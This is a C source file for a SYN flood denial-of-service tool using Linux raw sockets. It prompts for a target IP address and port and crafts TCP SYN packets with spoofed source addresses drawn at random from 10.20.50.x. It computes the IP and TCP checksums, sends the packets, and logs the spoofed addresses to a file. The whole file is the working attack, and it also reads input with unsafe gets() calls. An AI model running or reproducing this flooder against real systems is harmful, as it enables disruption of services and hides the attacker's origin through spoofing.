/*
    Syn Flood DOS with LINUX sockets
*/
#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h> //for exit(0);
#include<errno.h> //For errno - the error number
#include<netinet/tcp.h>   //Provides declarations for tcp header
#include<netinet/ip.h>    //Provides declarations for ip header
 
struct pseudo_header    //needed for checksum calculation
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
     
    struct tcphdr tcp;
};
 
unsigned short csum(unsigned short *ptr,int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;
 
    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }
 
    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
     
    return(answer);
}

int check_IP(char *IP){
    int num;
    int flag=1;
    int counter=0;
    char* p=strtok(IP, ".");
    
    while(p!=NULL){
        num=atoi(p);
        if(num>=0&&num<=255&&counter++<4){
	flag=1;
	p=strtok(NULL,".");
        }
	else{
		flag=0;
		break;
	}
     }
     return flag&&counter==4;
}
 
int main (void)
{
    int integerIP;
    int num;
    char stringIP[3];
   
    char dIP[16];
    char pseudodIP[16];

    FILE *file;
    file=fopen("IP_Numbers.txt","w");

    int destPort;
    printf("Enter IP number to attack: ");
    gets(dIP);
    strcpy(pseudodIP,dIP);
    while(check_IP(pseudodIP)==0){
       printf("Enter a valid IP number to attack: ");
       gets(dIP);
       strcpy(pseudodIP,dIP); 
    }

    printf("Enter destination port number: ");
    scanf("%d",&destPort);

    printf("IP Number: ");
    puts(dIP);
    printf("Port Number: %d\n",destPort);
    printf("Enter number of IP addresses you want to create: ");
    scanf("%d",&num);
    srand(time(NULL));
    printf("\n");

    int sourcePort;
for(int i=0;i<num;i++)
{
    //Create a raw socket
    int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
    //Datagram to represent the packet
    char datagram[4096] , source_ip[32];
    //IP header
    struct iphdr *iph = (struct iphdr *) datagram;
    //TCP header
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;

    integerIP=1+(rand()%254);

    int length = snprintf( NULL, 0, "%d", integerIP );
    char* str = malloc( length + 1 );
    snprintf( str, length + 1, "%d", integerIP );
    strcpy(source_ip , "10.20.50.");
    strcat(source_ip,str);
    free(str);
   
    sin.sin_family = AF_INET;
    sin.sin_port = htons(destPort);
    sin.sin_addr.s_addr = inet_addr (dIP);
     
    memset (datagram, 0, 4096); /* zero out the buffer */
     
    //Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
    iph->id = htons(54321);  //Id of this packet
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;      //Set to 0 before calculating checksum
    iph->saddr = inet_addr ( source_ip );    //Spoof the source ip address
    iph->daddr = sin.sin_addr.s_addr;
     
    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
     
    //TCP Header
    sourcePort=1024+(rand()%(65535-1024));
    tcph->source = htons (sourcePort);
    tcph->dest = htons (destPort);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;      /* first and only tcp segment */
    tcph->fin=0;
    tcph->syn=1;
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window = htons (5840); /* maximum allowed window size */
    tcph->check = 0;/* if you set a checksum to zero, your kernel's IP stack
                should fill in the correct checksum during transmission */
    tcph->urg_ptr = 0;
    //Now the IP checksum
     
    psh.source_address = inet_addr( source_ip );
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);
     
    memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
     
    tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));
     
    //IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
        exit(0);
    }
	//while(1){     
        //Send the packet
        if (sendto (s,      /* our socket */
                    datagram,   /* the buffer containing headers and data */
                    iph->tot_len,    /* total length of our datagram */
                    0,      /* routing flags, normally always 0 */
                    (struct sockaddr *) &sin,   /* socket addr, just like in */
                    sizeof (sin)) < 0)       /* a normal send() */
        {
            printf ("error\n");
        }
        //Data send successfully
       else
        {
          fprintf (file,"%s\n",source_ip);
        }
       // }   
} 
    fclose(file); 
    return 0;
}

